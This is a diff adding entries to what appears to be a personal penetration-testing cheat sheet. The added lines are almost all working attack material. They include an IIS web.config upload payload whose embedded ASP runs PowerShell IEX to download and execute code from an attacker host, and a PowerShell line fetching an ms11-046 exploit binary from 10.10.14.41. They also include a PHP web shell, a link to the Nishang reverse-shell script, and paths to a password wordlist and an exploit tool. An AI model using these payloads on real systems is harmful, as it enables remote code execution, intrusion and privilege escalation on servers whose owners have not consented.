@@ -132,7 +132,46 @@ php://input # php code execution, send php code in POST data `<? system('wget ht
 /var/lib/php/session s
 /tmp/ 
 ```
+* RCE
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file>')")
+o = cmd.StdOut.Readall()
+Respone.write(o)
+%>
+-->
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41/ms11-046.exe', 'C:\Users\merlin\Desktop\ms11-046.exe')
+```
+* Invoke Powershell
+```
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+```
 * RFI
 ```
 <?php echo shell_exec($_GET['cmd']);?>
+```
+* Files
+```
+/usr/share/wordlists/rockyou.txt
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
 ```
